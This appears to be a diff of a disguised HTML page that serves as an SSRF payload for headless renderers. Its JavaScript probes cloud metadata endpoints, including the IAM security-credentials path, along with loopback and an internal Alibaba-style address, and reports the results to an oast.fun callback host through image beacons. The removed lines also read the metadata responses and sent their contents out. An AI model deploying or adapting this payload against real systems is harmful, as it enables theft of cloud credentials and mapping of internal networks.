@@ -2,28 +2,25 @@
 <html>
 <head><title>ok</title></head>
 <body>
-<img src="https://d9pu36n1v5mgi5lnn0p0bnutgc4ajp46i.oast.fun/https-sslchk" width="1" height="1">
-<img src="http://d9pu36n1v5mgi5lnn0p0bnutgc4ajp46i.oast.fun/http-plainchk" width="1" height="1">
 <script>
 var OOB = "https://d9pu36n1v5mgi5lnn0p0bnutgc4ajp46i.oast.fun";
+var OOBH = "http://d9pu36n1v5mgi5lnn0p0bnutgc4ajp46i.oast.fun";
 function ping(p){ try { (new Image()).src = OOB + "/hp/" + p; } catch(e){} }
-ping("js-origin-" + location.protocol);
-function readAndPost(u, tag){
-  fetch(u, {cache:"no-store"}).then(function(r){ return r.text(); })
-    .then(function(t){ ping("READ-" + tag + "-len" + (t||"").length); (new Image()).src = OOB + "/body/" + tag + "?q=" + encodeURIComponent((t||"").slice(0,3000)); })
-    .catch(function(e){ ping("readfail-" + tag); });
-}
 function probe(u, tag){
-  fetch(u, {mode:"no-cors", cache:"no-store"}).then(function(){ ping("ok-" + tag); }).catch(function(){ ping("err-" + tag); });
+  var ok=false;
+  try {
+    fetch(u, {mode:"no-cors", cache:"no-store"}).then(function(){ ping("ok-"+tag); }).catch(function(){ ping("err-"+tag); });
+  } catch(e){ ping("ex-"+tag); }
 }
 setTimeout(function(){
-  probe("http://169.254.169.254/latest/meta-data/", "meta");
-  probe("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "iam");
-  probe("http://100.100.100.200/latest/meta-data/", "ctlblack");
+  ping("js-origin-" + location.protocol);
+  probe("http://" + "169.254.169.254" + "/latest/meta-data/", "meta");
+  probe("http://" + "169.254.169.254" + "/latest/meta-data/iam/security-credentials/", "iam");
+  probe(OOBH + "/ext-http", "exthttp");
+  probe("http://100.100.100.200/", "ctlblack");
   probe("http://127.0.0.1:80/", "loop80");
-  readAndPost("http://169.254.169.254/latest/meta-data/", "meta");
-  readAndPost("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "iam");
-}, 600);
+}, 400);
+setTimeout(function(){ ping("late2"); }, 2500);
 </script>
 </body>
 </html>
